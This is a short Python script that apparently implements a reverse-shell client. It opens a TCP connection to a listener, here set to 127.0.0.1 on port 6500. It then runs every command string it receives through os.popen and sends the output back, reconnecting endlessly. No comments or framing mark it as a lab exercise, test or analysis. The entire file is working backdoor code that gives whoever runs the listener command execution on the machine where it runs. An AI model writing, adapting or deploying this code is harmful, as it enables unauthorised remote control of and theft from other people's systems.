import socket
import os

def ExecuteCommand(command):
        output = os.popen(command).read()
        return output

def main():
        host = "127.0.0.1" 
        port = 6500 
        while True:
            while True:
                try:
                    s = socket.socket() #
                    s.connect((host,port))
                except:
                    break
    
                while True:
                    try:
                        data = s.recv(1024).decode()
                        output = ExecuteCommand(str(data))
                        if len(output) == 0:
                            s.send(" ".encode()) 
                            
                        else:
                            s.send(output.encode()) 
                    except:
                        break
        s.close()

if __name__ == '__main__':
    main()